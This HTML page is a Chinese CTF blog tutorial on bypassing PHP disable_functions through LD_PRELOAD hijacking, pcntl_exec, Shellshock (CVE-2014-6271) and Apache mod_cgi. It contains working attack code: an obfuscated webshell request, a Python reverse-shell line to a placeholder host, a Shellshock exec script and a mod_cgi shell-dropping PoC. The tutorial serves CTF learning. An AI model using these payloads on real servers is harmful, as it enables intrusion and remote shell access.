@@ -1,0 +1,643 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>Bypass Disable Function（一） - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Bypass Disable Function（一）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-13 20:10" pubdate>
+        August 13, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      46
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Bypass Disable Function（一）</h1>
+            
+            <div class="markdown-body">
+              <h3 id="Disable-Functions"><a class="header-anchor" href="#Disable-Functions">🍭</a>Disable Functions</h3>
+<p>平常的CTF中经常拿到webshell无法执行命令，原因：</p>
+<ul>
+<li>php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；</li>
+<li>web 进程运行在 rbash 这类受限 shell 环境中；</li>
+<li>WAF 拦劫。</li>
+</ul>
+<p>这时候就需要想办法绕过disable_functions。</p>
+<p>常见危险函数：</p>
+<ul>
+<li>phpinfo() ：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。</li>
+<li>passthru() ：允许执行一个外部程序并回显输出，类似于 exec()。</li>
+<li>exec() ：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。</li>
+<li>system() ：允许执行一个外部程序并回显输出，类似于 passthru()。</li>
+<li>chroot() ：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 PHP 时才能工作（不适用于 Windows 系统）。</li>
+<li>scandir() ：列出指定路径中的文件和目录。</li>
+<li>chgrp() ：改变文件或目录所属的用户组。</li>
+<li>chown() ：改变文件或目录的所有者。</li>
+<li>shell_exec() ：通过 Shell 执行命令，并将执行结果作为字符串返回。</li>
+<li>proc_open() ：执行一个命令并打开文件指针用于读取以及写入。</li>
+<li>proc_get_status() ：获取使用 proc_open() 所打开进程的信息。</li>
+<li>error_log() ：将错误信息发送到指定位置（文件）。 安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode， 执行任意命令。</li>
+<li>ini_alter() ：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。 具体参见 ini_set()。</li>
+<li>ini_set() ：可用于修改、设置 PHP 环境配置参数。</li>
+<li>ini_restore() ：可用于恢复 PHP 环境配置参数到其初始值。</li>
+<li>dl() ：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</li>
+<li>pfsockopen() ：建立一个 Internet 或 UNIX 域的 socket 持久连接。</li>
+<li>syslog() ：可调用 UNIX 系统的系统层 syslog() 函数。</li>
+<li>readlink() ：返回符号连接指向的目标文件内容。</li>
+<li>symlink() ：在 UNIX 系统中建立一个符号链接。</li>
+<li>popen() ：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</li>
+<li>stream_socket_server() ：建立一个 Internet 或 UNIX 服务器连接。</li>
+<li>putenv() ：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数 修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</li>
+</ul>
+<h3 id="绕过方式"><a class="header-anchor" href="#绕过方式">🍭</a>绕过方式</h3>
+<ul>
+<li>第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash  的破壳漏洞；</li>
+<li>第二种，寻找未禁用的漏网函数，常见的执行命令的函数有  system()、exec()、shell_exec()、passthru()，偏僻的     popen()、proc_open()、pcntl_exec()，逐一尝试；</li>
+<li>第三种，mod_cgi 模式，尝试修改  .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；</li>
+<li>第四种，利用环境变量 LD_PRELOAD  劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果</li>
+</ul>
+<h3 id="利用-LD-PRELOAD-环境变量"><a class="header-anchor" href="#利用-LD-PRELOAD-环境变量">🍭</a>利用 LD_PRELOAD 环境变量</h3>
+<h4 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h4>
+<p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），允许定义在程序运行前优先加载的动态链接库。主要用来有选择性的载入不同动态链接库中的相同函数。我们可以通过它在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的攻击目的。通过环境变量 LD_PRELOAD 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
+<h4 id="条件"><a class="header-anchor" href="#条件">🍭</a>条件</h4>
+<ul>
+<li>能上传自己的.so文件</li>
+<li>能够控制LD_PRELOAD环境变量的值，比如putenv()函数 因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</li>
+</ul>
+<h4 id="思路"><a class="header-anchor" href="#思路">🍭</a>思路</h4>
+<p>利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 <a target="_blank" rel="noopener" href="http://c.so">c.so</a>  中，所以系统为该进程加载共 <a target="_blank" rel="noopener" href="http://c.so">c.so</a>，想法在 <a target="_blank" rel="noopener" href="http://c.so">c.so</a> 前优先加载可控的 c_evil.so，c_evil.so  内含与 b()  同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  <a target="_blank" rel="noopener" href="http://c.so">c.so</a> 内  b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p>
+<h4 id="流程"><a class="header-anchor" href="#流程">🍭</a>流程</h4>
+<ul>
+<li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</li>
+<li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为  getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；</li>
+<li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步   LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名   getuid() 所劫持；</li>
+<li>达到不调用 PHP 的各种命令执行函数达到执行系统命令的目的。</li>
+</ul>
+<h4 id="阻碍"><a class="header-anchor" href="#阻碍">🍭</a>阻碍</h4>
+<ul>
+<li>某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，通常的 www-data 权限不能更改 php.ini 配置、安装 sendmail 软件；</li>
+<li>即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 无法将主机名加入 hosts</li>
+</ul>
+<h4 id="利用：-极客大挑战-2019-RCE-ME"><a class="header-anchor" href="#利用：-极客大挑战-2019-RCE-ME">🍭</a>利用：[极客大挑战 2019]RCE ME</h4>
+<p>无字母shell后发现禁了一堆函数</p>
+<p><img src="/2021/08/13/ff/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>构造shell连上蚁剑后无法执行命令：</p>
+<p><img src="/2021/08/13/ff/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>需要利用如下几个文件：</p>
+<p><img src="/2021/08/13/ff/4.png" srcset="/img/loading.gif" alt="4"></p>
+<ul>
+<li>
+<p>bypass_disablefunc.php：一个用来执行命令的 webshell。</p>
+<p>上传到web目录的直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：</p>
+<ul>
+<li>cmd 参数：待执行的系统命令，如 id 命令。</li>
+<li>outpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。</li>
+<li>sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。</li>
+</ul>
+</li>
+<li>
+<p>bypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。</p>
+</li>
+<li>
+<p>bypass_disablefunc.c：用来编译生成上面的共享对象文件。</p>
+</li>
+</ul>
+<p>将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标有权限的目录中</p>
+<p><img src="/2021/08/13/ff/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>然后将bypass_disablefunc.php包含进来并使用GET方法提供所需的参数：</p>
+<pre><code class="hljs markdown">?code=$&#123;<span class="hljs-emphasis">_GET&#125;[<span class="hljs-string">_</span>](<span class="hljs-link">$&#123;_GET&#125;[_]</span>);&amp;_</span>=assert&amp;<span class="hljs-strong">__=include(%27/var/tmp/bypass<span class="hljs-emphasis">_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_</span>disablefunc<span class="hljs-emphasis">_x64.so</span></span></code></pre>
+<p>异或构造</p>
+<pre><code class="hljs sas">?code=$&#123;<span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span>^<span class="hljs-name">%a1</span><span class="hljs-name">%b9</span><span class="hljs-name">%bb</span><span class="hljs-name">%aa</span>&#125;[_]($&#123;<span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span><span class="hljs-name">%fe</span>^<span class="hljs-name">%a1</span><span class="hljs-name">%b9</span><span class="hljs-name">%bb</span><span class="hljs-name">%aa</span>&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so</code></pre>
+<p>执行</p>
+<p><img src="/2021/08/13/ff/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>也可以直接用蚁剑的插件disabled_functions,选择模式后会在<code>/var/www/html</code>目录里上传一个<code>.antproxy.php</code>文件。我们创建副本, 并将连接的 URL shell 脚本名字改为<code>.antproxy.php</code>获得一个新的shell，在这个新shell里面就可以成功执行命令。</p>
+<h4 id="利用-pcntl-exec"><a class="header-anchor" href="#利用-pcntl-exec">🍭</a>利用 pcntl_exec</h4>
+<p>条件：PHP安装并启用了pcntl插件</p>
+<p>pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但经常忽略pcntl扩展的相关函数。pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。</p>
+<p>利用pcntl_exec()<a target="_blank" rel="noopener" href="http://xn--test-pk6hg45q.sh">执行test.sh</a>：</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>(function_exists(<span class="hljs-string">&#x27;pcntl_exec&#x27;</span>)) &#123;
+   pcntl_exec(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/tmp/test.sh&quot;</span>));
+&#125; <span class="hljs-keyword">else</span> &#123;
+       <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;pcntl extension is not support!&#x27;</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>pcntl_exec()执行命令没有回显，常与python结合来反弹shell：</p>
+<pre><code class="hljs javascript">&lt;?php pcntl_exec(<span class="hljs-string">&quot;/usr/bin/python&quot;</span>,array(<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;xxx&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</code></pre>
+<p>[第四届“蓝帽杯”决赛]php这道题利用的就是这个点。</p>
+<h5 id="利用-ShellShock（CVE-2014-6271）"><a class="header-anchor" href="#利用-ShellShock（CVE-2014-6271）">🍭</a>利用 ShellShock（CVE-2014-6271）</h5>
+<p>这个洞比较老，而且现在没怎么见过，蚁剑终端集成了对 ShellShock 的利用，可以直接执行命令。</p>
+<h5 id="条件-v2"><a class="header-anchor" href="#条件-v2">🍭</a>条件</h5>
+<p>Linux 操作系统 <code>putenv()</code>、<code>mail()</code>或<code>error_log()</code>函数可用 目标系统的<code>/bin/bash</code>存在<code>CVE-2014-6271</code>漏洞 <code>/bin/sh -&gt; /bin/bash</code>sh 默认的 shell 是 bash</p>
+<h5 id="原理-v2"><a class="header-anchor" href="#原理-v2">🍭</a>原理</h5>
+<p>Bash使用的环境变量是通过函数名称来调用的，导致该漏洞出现是以<code>()&#123;</code>开头定义的环境变量在命令 ENV 中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。一般函数体内的代码不会被执行，但该漏洞会错误的将”{}”花括号外的命令进行执行。PHP里的某些函数（例如：mail()、imap_mail()）能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。</p>
+<h5 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h5>
+<p>蚁剑终端或手动利用：</p>
+<p>在有权限的目录中（/var/tmp）上传以下利用脚本：</p>
+<pre><code class="hljs javascript">&lt;?php 
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shellshock</span>(<span class="hljs-params">$cmd</span>) </span>&#123; <span class="hljs-comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span>
+   $tmp = tempnam(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>); 
+   putenv(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;</span>); 
+   error_log(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);
+   $output = @file_get_contents($tmp); 
+   @unlink($tmp); 
+   <span class="hljs-keyword">if</span>($output != <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">return</span> $output; 
+   <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No output, or not vuln.&quot;</span>; 
+&#125; 
+echo shellshock($_REQUEST[<span class="hljs-string">&quot;cmd&quot;</span>]); 
+?&gt;</code></pre>
+<p>包含该脚本，传参即可。</p>
+<h4 id="利用-Apache-Mod-CGI"><a class="header-anchor" href="#利用-Apache-Mod-CGI">🍭</a>利用 Apache Mod CGI</h4>
+<h5 id="条件-v3"><a class="header-anchor" href="#条件-v3">🍭</a>条件</h5>
+<p>Linux 操作系统 Apache + PHP (apache 使用 apache_mod_php) Apache 开启了<code>cgi</code>、<code>rewrite</code> Web 目录给了<code>AllowOverride</code>权限 当前目录可写</p>
+<h5 id="原理-v3"><a class="header-anchor" href="#原理-v3">🍭</a>原理</h5>
+<p>早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。之后出现了动态技术，但是Web服务器不能直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通就出现了CGI（Common Gateway Interface）通用网关接口。</p>
+<p>当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，效率很低。而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。相当于Web服务器启动的时就启动相应模块。当有新的动态请求进来时，Web服务器能自己解析这些动态脚本。</p>
+<p>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本：</p>
+<ul>
+<li>文件具有已由AddType指令定义的扩展名</li>
+<li>文件位于ScriptAlias目录中</li>
+</ul>
+<p>Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：</p>
+<pre><code class="hljs javascript">Options +ExecCGIAddHandler cgi-script .xxx</code></pre>
+<p>这样当前目录下的所有的.xxx文件会当做CGI程序执行。故我们可以利用CGI来执行系统命令绕过disable_functions</p>
+<h5 id="利用-v2"><a class="header-anchor" href="#利用-v2">🍭</a>利用</h5>
+<p>搭建个 <a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a> 项目来测试</p>
+<p><img src="/2021/08/13/ff/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>连接后终端无法执行：</p>
+<p><img src="/2021/08/13/ff/8.png" srcset="/img/loading.gif" alt="8"></p>
+<p>目标主机开启了CGI，Web目录下有写入的权限。我们可以上传创建 .htaccess ：</p>
+<pre><code class="hljs gradle"><span class="hljs-keyword">Options</span> +ExecCGI
+AddHandler cgi-script .<span class="hljs-keyword">ant</span></code></pre>
+<p>shell.ant:</p>
+<pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span>
+<span class="hljs-built_in">echo</span> Content-type: text/html
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-built_in">echo</span>&amp;&amp;id</code></pre>
+<p>注：linux中CGI比较严格，上传后可能会发现状态码500，无法解析bash。因为目标站点是linux环境，若用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。</p>
+<p><img src="/2021/08/13/ff/11.png" srcset="/img/loading.gif" alt="11"></p>
+<p>添加权限：</p>
+<pre><code class="hljs gradle">?<span class="hljs-keyword">ant</span>=chmod(<span class="hljs-string">&#x27;shell.ant&#x27;</span>,<span class="hljs-number">0777</span>);</code></pre>
+<p>访问便可执行</p>
+<p><img src="/2021/08/13/ff/12.png" srcset="/img/loading.gif" alt="12"></p>
+<p>POC</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$cmd = <span class="hljs-string">&quot;ls /&quot;</span>; <span class="hljs-comment">//command to be executed</span>
+$shellfile = <span class="hljs-string">&quot;#!/bin/bashn&quot;</span>; <span class="hljs-comment">//using a shellscript</span>
+$shellfile .= <span class="hljs-string">&quot;echo -ne &quot;</span>Content-Type: text/html\n\n<span class="hljs-string">&quot;n&quot;</span>; <span class="hljs-comment">//header is needed, otherwise a 500 error is thrown when there is output</span>
+$shellfile .= <span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>; <span class="hljs-comment">//executing $cmd</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkEnabled</span>(<span class="hljs-params">$text,$condition,$yes,$no</span>) //<span class="hljs-title">this</span> <span class="hljs-title">surely</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">shorter</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$text</span>: &quot;</span> . ($condition ? $yes : $no) . <span class="hljs-string">&quot;&lt;br&gt;n&quot;</span>;
+&#125;
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;checked&#x27;</span>]))
+&#123;
+    @file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="hljs-comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span>
+    header(<span class="hljs-string">&#x27;Location: &#x27;</span> . $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] . <span class="hljs-string">&#x27;?checked=true&#x27;</span>); <span class="hljs-comment">//execute the script again to see if the htaccess test worked</span>
+&#125;
+<span class="hljs-keyword">else</span>
+&#123;
+    $modcgi = in_array(<span class="hljs-string">&#x27;mod_cgi&#x27;</span>, apache_get_modules()); <span class="hljs-comment">// mod_cgi enabled?</span>
+    $writable = is_writable(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//current dir writable?</span>
+    $htaccess = !<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&#x27;HTACCESS&#x27;</span>]); <span class="hljs-comment">//htaccess enabled?</span>
+        checkEnabled(<span class="hljs-string">&quot;Mod-Cgi enabled&quot;</span>,$modcgi,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);
+        checkEnabled(<span class="hljs-string">&quot;Is writable&quot;</span>,$writable,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);
+        checkEnabled(<span class="hljs-string">&quot;htaccess working&quot;</span>,$htaccess,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);
+    <span class="hljs-keyword">if</span>(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))
+    &#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="hljs-comment">//abort if not</span>
+    &#125;
+    <span class="hljs-keyword">else</span>
+    &#123;
+        checkEnabled(<span class="hljs-string">&quot;Backing up .htaccess&quot;</span>,copy(<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.htaccess.bak&quot;</span>),<span class="hljs-string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//make a backup, cause you never know.</span>
+        checkEnabled(<span class="hljs-string">&quot;Write .htaccess file&quot;</span>,file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-string">&quot;Options +ExecCGInAddHandler cgi-script .dizzle&quot;</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//.dizzle is a nice extension</span>
+        checkEnabled(<span class="hljs-string">&quot;Write shell file&quot;</span>,file_put_contents(<span class="hljs-string">&#x27;shell.dizzle&#x27;</span>,$shellfile),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//write the file</span>
+        checkEnabled(<span class="hljs-string">&quot;Chmod 777&quot;</span>,chmod(<span class="hljs-string">&quot;shell.dizzle&quot;</span>,<span class="hljs-number">0777</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//rwx</span>
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="hljs-comment">//call the script</span>
+    &#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>也可用蚁剑插件</p>
+<p><img src="/2021/08/13/ff/10.png" srcset="/img/loading.gif" alt="10"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/bypass/">bypass</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/14/ff2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Bypass Disable Functions（二）—— Fastcgi 协议分析与 PHP-FPM 攻击方法</span>
